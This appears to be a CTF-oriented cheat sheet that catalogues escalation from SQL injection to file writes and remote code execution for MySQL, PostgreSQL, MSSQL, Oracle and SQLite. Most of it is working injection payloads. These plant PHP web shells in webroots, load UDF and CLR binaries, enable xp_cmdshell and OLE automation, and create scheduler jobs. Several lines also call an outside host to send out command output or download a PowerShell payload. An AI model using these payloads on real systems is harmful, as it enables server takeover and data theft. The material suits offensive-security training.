# SQLi → RCE / file-write — the escalation catalogue

Extraction is the default goal; sometimes the flag needs command
execution or a file written to the webroot. This file collects the
write/exec primitives per DBMS, their preconditions, and how to
verify each gate before betting the attempt on it.

Ordering principle: a file-write primitive is cheaper than a
command-exec primitive; command-exec is cheaper than chained
privilege escalation. Try them in that order.

---

## 1. Preconditions — verify before you build

```sql
-- can the session write files at all?
SELECT user();                            -- whoami at DB level
SELECT file_priv FROM mysql.user WHERE user=current_user;   -- MySQL
SHOW GRANTS; SHOW GRANTS FOR CURRENT_USER;
SELECT current_setting('is_superuser');   -- PG
SELECT IS_SRVROLEMEMBER('sysadmin');      -- MSSQL
SELECT privilege FROM session_privs;      -- Oracle
SELECT * FROM pragma_function_list        -- SQLite ext fns
   WHERE name IN ('readfile','writefile','load_extension');
```

The gate questions:

```text
[ ] FILE privilege / write-capable role?
[ ] webroot path known or discoverable?
[ ] exec-capable object (xp_cmdshell, UDF, COPY PROGRAM, extproc,
    load_extension, sp_OACreate) reachable?
[ ] stacked statements allowed (driver-level)?
[ ] outbound connectivity for OOB/loading?
```

Every section below starts with the precondition check — run it
first, not the payload.

---

## 2. MySQL / MariaDB

### INTO OUTFILE / DUMPFILE — file write (needs FILE priv)

```sql
' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE
   '/var/www/html/s.php'-- -
' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2263225d293b
   203f3e INTO DUMPFILE '/var/www/html/s.php'-- -
' UNION SELECT NULL,'<?=`$_GET[c]`?>',NULL INTO OUTFILE '/tmp/s'-- -
```

Differences:

- `OUTFILE` writes a TEXT file — newlines/padding added, binary
  unsafe for .so/.dll; fine for .php/.txt.
- `DUMPFILE` writes ONE row verbatim binary — for UDF .so uploads.
- Path must be writable by the mysql user; `secure_file_priv` var
  may confine writes to `/var/lib/mysql-files/`:

  ```sql
  SHOW VARIABLES LIKE 'secure_file_priv';   -- NULL=off, ''=any, path=jail
  SELECT @@secure_file_priv;
  SELECT @@datadir;                          -- fallback write target
  ```

- File can't already exist — pick fresh names.
- On Windows, `\\` paths need escaping or forward slashes.

Discover the webroot:

```sql
SELECT @@datadir;                          -- /var/lib/mysql/
SELECT @@basedir;                          -- install root
SELECT @@plugin_dir;                       -- UDF target
SELECT load_file('/etc/apache2/sites-enabled/000-default.conf');
SELECT load_file('/proc/self/cwd/index.php');                  -- app root
SELECT load_file('/var/www/html/.htaccess');
```

### UDF (user-defined function) — command exec via .so

```sql
-- 1. write the udf binary to @@plugin_dir via DUMPFILE
SELECT <udf-so-hex> INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
-- 2. register + call
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
SELECT sys_exec('id > /tmp/x');
SELECT sys_eval('id');                   -- exec with output
```

The lib_mysqludf_sys.so blob is well-known; in a CTF carry it as a
hex literal — `0x7f454c46...` — inside the DUMPFILE SELECT. Gates:
FILE priv + plugin_dir writable + INSERT/DELETE on mysql.func.

### General-log poisoning — file write without FILE priv (4.x/5.x)

```sql
SET GLOBAL general_log='ON';
SET GLOBAL general_log_file='/var/www/html/x.php';
SELECT '<?php system($_GET["c"]); ?>';    -- lands in the log file
```

Needs SUPER; bypasses secure_file_priv since mysqld writes the log
itself. Slow-query-log variant: `long_query_time=0` + any query.

### MariaDB differences

- `sys_exec`-style UDF works identically.
- `LOAD DATA LOCAL INFILE` — server reads a file from the CLIENT:
  use with rogue-mysql-server trickery (auth path, not injection).
- `SEQUENCE`/`CONNECT` engines — file writing via CONNECT engine
  `table_type=FILE_NAME`: niche, documented in extended-corpus.

---

## 3. PostgreSQL

### COPY ... TO/FROM PROGRAM — the exec primitive (9.3+, superuser)

```sql
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/x';-- -
'; COPY t(x) FROM PROGRAM 'cat /flag';-- -      -- output into table
   UNION SELECT x FROM t;-- -                     -- then read it back
'; COPY t(x) FROM PROGRAM 'curl http://me/$(id|base64)';-- -  -- OOB exec
```

Check: `SELECT current_setting('is_superuser')` → `on`, or
`pg_read_server_files`/`pg_execute_server_program` role on 11+:

```sql
SELECT has_role(current_user,'pg_execute_server_program');  -- fn name:
SELECT has_table_privilege(...) → use pg_has_role:
SELECT pg_has_role(current_user,'pg_execute_server_program','member');
```

### COPY TO file — write primitives

```sql
'; COPY (SELECT '<?php system($_GET["c"]); ?>') TO
   '/var/www/html/s.php';-- -
COPY (SELECT $$<?php system($_GET["c"]);?>$$) TO '/var/www/x.php';
```

`lo_export`/`lo_import` large-object path (needs only INSERT on
pg_largeobject — NOT superuser!):

```sql
SELECT lo_import('/etc/passwd');                   -- file → largeobject
SELECT lo_export(<loid>, '/tmp/x');                 -- largeobject → file
SELECT lo_create(31337);
INSERT INTO pg_largeobject(loid,pageno,data) VALUES
   (31337,0,decode('<?php system($_GET["c"]);?>','escape'));
SELECT lo_export(31337,'/var/www/html/s.php');
SELECT lo_unlink(31337);
```

The `pg_largeobject` route is THE low-privilege write on PG —
sqlmap `--file-write` uses exactly this.

### Untrusted PL + dblink

```sql
CREATE FUNCTION x() RETURNS void AS $$ ... $$ LANGUAGE plpython3u;   -- needs untrusted lang installed
SELECT dblink_connect('host=127.0.0.1 ...');                         -- lateral via dblink
CREATE EXTENSION dblink;                                              -- superuser only
```

`CREATE EXTENSION` needs superuser; `plpython3u`/`plperlu` give
direct exec — mostly a lab/CTF shape.

---

## 4. MSSQL

### xp_cmdshell — the canonical exec

```sql
'; EXEC xp_cmdshell 'whoami';-- -
'; EXEC xp_cmdshell 'powershell -c "iwr http://me/x -o c:\x.ps1"';-- -
-- enable it (needs sysadmin):
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
-- capture output: insert into table
'; CREATE TABLE t(x nvarchar(4000));
   INSERT INTO t EXEC xp_cmdshell 'dir c:\';-- -
   ' UNION SELECT x,NULL FROM t-- -              -- read output rows
```

Enabled check: `SELECT value FROM sys.configurations WHERE
name='xp_cmdshell'` or just try it — the error tells.

### sp_OACreate / sp_OAMethod — OLE automation (works without xp_cmdshell)

```sql
'; DECLARE @o int;
   EXEC sp_OACreate 'wscript.shell',@o OUT;
   EXEC sp_OAMethod @o,'run',null,'cmd /c whoami > c:\inetpub\wwwroot\o.txt';-- -
   EXEC sp_OADestroy @o;-- -
'; EXEC sp_OACreate 'Scripting.FileSystemObject',@o OUT;
   EXEC sp_OAMethod @o,'OpenTextFile',@f OUT,'c:\inetpub\wwwroot\flag',1;
   EXEC sp_OAMethod @f,'ReadAll',@s OUT;-- -
```

Needs `Ole Automation Procedures` enabled:

```sql
'; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;-- -
```

### BULK INSERT + OPENROWSET — file read/write

```sql
'; CREATE TABLE t(x nvarchar(max));
   BULK INSERT t FROM 'c:\inetpub\wwwroot\web.config';-- -
   ' UNION SELECT x,NULL FROM t-- -
' UNION SELECT * FROM OPENROWSET(BULK 'c:\flag.txt',
   SINGLE_CLOB) x-- -
'; EXEC master..xp_dirtree 'c:\';-- -             -- dir listing!
'; EXEC master..xp_fileexist 'c:\flag.txt';-- -   -- exists oracle
```

`xp_dirtree` is the freebie: on many installs it works WITHOUT
xp_cmdshell enabled, as it's just a filesystem walk.

### Agent jobs / SSIS — scheduled exec

```sql
'; EXEC msdb.dbo.sp_add_job @job_name='x';
   EXEC msdb.dbo.sp_add_jobstep @job_name='x',
        @step_name='s',@subsystem='CmdExec',@command='whoami > c:\o.txt';
   EXEC msdb.dbo.sp_add_jobserver @job_name='x';
   EXEC msdb.dbo.sp_start_job 'x';-- -
```

### CLR assembly — `CREATE ASSEMBLY` + exec

```sql
'; EXEC sp_configure 'clr enabled',1; RECONFIGURE;
   CREATE ASSEMBLY x FROM 0x4d5a... WITH PERMISSION_SET=UNSAFE;
   CREATE PROCEDURE x AS EXTERNAL NAME x.x.x;-- -
```

### Linked servers / ad-hoc queries

```sql
'; EXEC sp_configure 'Ad Hoc Distributed Queries',1; RECONFIGURE;
   SELECT * FROM OPENROWSET('SQLOLEDB','server=x;uid=a;pwd=b',
        'SELECT @@version');-- -
```

---

## 5. Oracle

### Java stored procedures — the modern path (Oracle 11g+)

```sql
-- needs CREATE PROCEDURE + JAVA privs:
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED x AS
   'import java.io.*; public class x { public static String r(String c)
   throws Exception { return new java.util.Scanner(
   Runtime.getRuntime().exec(c).getInputStream()).useDelimiter("\\A")
   .next(); } }';
CREATE OR REPLACE FUNCTION r(c varchar2) RETURN varchar2
   AS LANGUAGE JAVA NAME 'x.r(java.lang.String) return java.lang.String';
SELECT r('id') FROM dual;
```

### External procedures (extproc) — legacy but still found

```sql
CREATE LIBRARY x AS '$ORACLE_HOME/bin/oracle';   -- needs CREATE LIBRARY
CREATE FUNCTION x(c IN varchar2) RETURN varchar2
   AS EXTERNAL NAME 'system' LIBRARY x LANGUAGE C;
```

### Scheduler jobs

```sql
BEGIN dbms_scheduler.create_job(job_name=>'x',job_type=>'EXECUTABLE',
   job_action=>'/bin/sh -c "id > /tmp/o"',enabled=>TRUE); END;
```

### UTL_FILE — file IO (pre-12c default public grant!)

```sql
DECLARE f UTL_FILE.FILE_TYPE; BEGIN
   f := UTL_FILE.FOPEN('DIR','x.php','W');
   UTL_FILE.PUT_LINE(f,'<?php system($_GET[c]);?>');
   UTL_FILE.FCLOSE(f); END;
SELECT UTL_HTTP.REQUEST('http://me/'||user) FROM dual;   -- OOB exec-free
```

### DBMS_XMLGEN / EXTRACTVALUE — read primitives that echo

```sql
SELECT dbms_xmlgen.getxml('SELECT user FROM dual') FROM dual;
```

---

## 6. SQLite

```sql
-- ATTACH + CREATE+INSERT = file write (see sqlite.md §7):
'; ATTACH DATABASE '/var/www/html/s.php' AS x;
   CREATE TABLE x.t(a); INSERT INTO x.t VALUES
   ('<?php system($_GET[c]);?>');-- -

-- load_extension = exec (usually disabled):
' UNION SELECT load_extension('/tmp/evil.so')-- -

-- writefile() ext fn (CLI-linked only):
' UNION SELECT writefile('/var/www/html/s.php',
   '<?php system($_GET[c]);?>')-- -
```

---

## 7. Writing THROUGH the query (no stacked needed)

When stacked is off but UNION works, file-write can still happen if
the query itself is a SELECT you can append to:

```sql
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/w/s.php'-- -
'; COPY (SELECT '<?php ...') TO '/w/s.php';-- -      -- PG stacked
' UNION SELECT 1,2 INTO DUMPFILE '/w/s.bin'-- -      -- MySQL
```

`INTO OUTFILE` inside a UNION subselect works on MySQL when placed
at the end — the whole union's output goes to the file.

---

## 8. Confirming the write/exec worked

```text
file write   → GET the file: /s.php?c=id — the response IS proof
file write   → time: write a PHP that sleeps, measure render lag
exec         → output table read back via UNION (xp_cmdshell,
               COPY FROM PROGRAM)
exec         → OOB: the exec itself curls out with the flag
exec         → side effect: a file appears, a service changes
```

`oob.md` covers the data-over-DNS/HTTP variants when nothing renders.

---

## 9. The gate-order checklist

```text
[ ] is_superuser / FILE priv / sysadmin — checked first
[ ] secure_file_priv / write jail — checked before OUTFILE
[ ] webroot known — else load_file a config to find it
[ ] stacked allowed — else UNION-embedded write or single-statement
    alternatives (xp_cmdshell in EXEC is single!)
[ ] exec objects enabled or enableable — xp_cmdshell, OLE, CLR,
    COPY PROGRAM, load_extension
[ ] low-priv alternative tried — pg_largeobject, xp_dirtree,
    UTL_FILE, mysql general_log
[ ] OOB path reserved as fallback — a single UNC/DNS exec beats
    nothing rendering
```

---

## 10. Cross-file index

| Primitive | File |
|---|---|
| File-read payloads per DBMS | `file-operations.md` |
| OOB/UNC/DNS exec-back | `oob.md` |
| ATTACH/write details | `sqlite.md` §7 |
| xp_cmdshell variants | `mssql.md` §8 |
| COPY PROGRAM variants | `postgresql.md` §9 |
| UDF .so build notes | `mysql.md` §8 |
| UTL_FILE/Java in Oracle | `oracle.md` §7 |
